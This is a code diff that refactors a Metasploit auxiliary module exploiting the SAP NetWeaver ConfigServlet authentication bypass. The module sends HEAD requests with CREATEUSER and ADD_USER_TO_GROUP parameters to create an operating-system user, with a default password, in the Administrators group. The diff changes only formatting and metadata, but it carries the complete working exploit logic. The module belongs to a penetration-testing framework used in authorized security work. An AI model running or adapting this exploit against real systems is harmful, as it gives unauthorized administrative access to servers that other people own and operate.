@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -20,8 +20,6 @@
 # just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -36,17 +34,20 @@ class MetasploitModule < Msf::Auxiliary
         OS user management. Information about resolution should be available at SAP notes
         1589525 and 1624450 (authentication required).
       },
-      'References' =>
-        [
-          [ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ],
-          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf' ]
-        ],
-      'Author' =>
-        [
-          'Alexandr Polyakov', # Vulnerability discovery
-          'nmonkee' # Metasploit module
-        ],
-      'License' => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ],
+        [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf' ]
+      ],
+      'Author' => [
+        'Alexandr Polyakov', # Vulnerability discovery
+        'nmonkee' # Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options([
@@ -54,23 +55,23 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('USERNAME', [true, 'Username to create', 'msf']),
       OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),
       OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])
-    ], self.class)
+    ])
   end
 
-  def run_host(ip)
-    vprint_status("#{rhost}:#{rport} - Creating User...")
+  def run_host(_ip)
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Creating User...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']
     if send_request(uri)
-      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
     else
       return
     end
 
-    vprint_status("#{rhost}:#{rport} - Adding User to Group...")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Adding User to Group...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USERNAME'] + ',GROUPNAME=' + datastore['GROUP']
     res = send_request(uri)
     if res
-      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
     else
       return
     end
@@ -112,22 +113,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_request(uri)
-    begin
-      res = send_request_cgi({
-        'uri' => uri,
-        'method' => 'HEAD',
-        'ctype' => 'text/xml; charset=UTF-8',
-        'cookie' => 'sap-usercontext=sap-language=EN'
-      })
-      if res and res.code == 200 and res.headers['Server'] =~ /SAP J2EE Engine/
-        return true
-      elsif res
-        vprint_error("#{rhost}:#{rport} - Unexpected Response: #{res.code} #{res.message}")
-        return false
-      end
-    rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Unable to connect")
+    res = send_request_cgi({
+      'uri' => uri,
+      'method' => 'HEAD',
+      'ctype' => 'text/xml; charset=UTF-8',
+      'cookie' => 'sap-usercontext=sap-language=EN'
+    })
+    if res && (res.code == 200) && res.headers['Server'] =~ /SAP J2EE Engine/
+      return true
+    elsif res
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Unexpected Response: #{res.code} #{res.message}")
       return false
     end
+  rescue ::Rex::ConnectionError
+    vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
+    return false
   end
 end
